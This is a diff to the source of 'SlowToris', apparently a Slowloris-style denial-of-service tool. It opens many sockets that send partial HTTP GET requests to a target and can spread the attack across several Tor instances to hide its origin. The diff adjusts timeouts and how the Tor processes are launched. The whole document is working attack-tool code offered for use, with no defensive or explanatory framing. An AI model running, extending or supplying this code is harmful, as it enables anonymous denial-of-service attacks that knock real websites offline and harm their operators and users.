@@ -59,7 +59,7 @@ class SlowToris:
 
     def init_connection(self):
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        sock.settimeout(5)
+        sock.settimeout(15)
         sock.connect((self.target, self.port))
         sock.send("GET /?{} HTTP/1.1\r\n".format(randint(0, 2000)).encode("utf-8"))
         if self.randomize:
@@ -144,7 +144,7 @@ def main(target, port, sockets, randomize, tor, tor_instances, proxy, quiet):
 
     if tor:
         subprocess.run(['mkdir', '-pv', 'data/tor0'])
-        subprocess.Popen(['tor', '--RunAsDaemon', '1', '--ControlPort', '8050' ,'--PidFile', 'tor0.pid', '--SocksPort', '9050', '--DataDirectory', 'data/tor0'], stdin=None, stdout=None, stderr=None)
+        subprocess.Popen(['tor', '--ControlPort', '8050' ,'--PidFile', 'tor0.pid', '--SocksPort', '9050', '--DataDirectory', 'data/tor0'], stdin=None, stdout=None, stderr=None)
         time.sleep(1)
         tmp = subprocess.check_output(['tor-resolve', '-p', '9050', target])
         target = tmp.decode('utf-8').strip('\n')
@@ -154,9 +154,8 @@ def main(target, port, sockets, randomize, tor, tor_instances, proxy, quiet):
             control_port = str(TOR_CONTROL_PORT + i)
             socks_port = TOR_SOCKS_PORT + i
             subprocess.run(['mkdir', '-pv', 'data/tor'+str(i)])
-            subprocess.Popen(['tor', '--RunAsDaemon', '1', '--ControlPort', control_port, '--PidFile', 'tor'+str(i)+'.pid', '--SocksPort', str(socks_port), '--DataDirectory', 'data/tor'+str(i)], stdin=None, stdout=None, stderr=None)
+            subprocess.Popen(['tor', '--ControlPort', control_port, '--PidFile', 'tor'+str(i)+'.pid', '--SocksPort', str(socks_port), '--DataDirectory', 'data/tor'+str(i)], stdin=None, stdout=None, stderr=None)
             tors[i] = SlowToris(target, port, sockets, randomize, '127.0.0.1', socks_port)
-        time.sleep(5)
         for i in tors:
             tors[i].run()
 
